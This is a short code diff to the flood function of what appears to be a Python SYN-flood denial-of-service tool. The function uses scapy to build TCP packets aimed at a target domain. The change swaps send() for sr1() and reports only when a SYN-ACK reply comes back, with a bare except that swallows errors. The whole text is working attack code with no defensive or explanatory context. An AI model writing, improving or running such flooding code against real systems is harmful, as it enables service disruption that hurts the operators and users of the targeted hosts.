@@ -1,9 +1,8 @@
 import socket
 from random import randint
-from typing import Union
 
 from colorama import Fore as F
-from scapy.all import Raw, send
+from scapy.all import Raw, sr1
 from scapy.layers.inet import IP, TCP
 
 from tools.addons.ip_tools import get_target_domain
@@ -27,5 +26,10 @@ def flood(target: str) -> None:
 
     packet = ip_layer / tcp_layer / data
 
-    send(packet, verbose=0)
-    print(f"--> Socket on Port {F.BLUE}{sport}{F.RESET} sent a SYN packet")
+    ans = sr1(packet, verbose=0)
+
+    try:
+        if ans[1].flags.flagrepr() == "SA":
+            print(f"--> Socket on Port {F.BLUE}{sport}{F.RESET} sent a SYN packet")
+    except:
+        ...
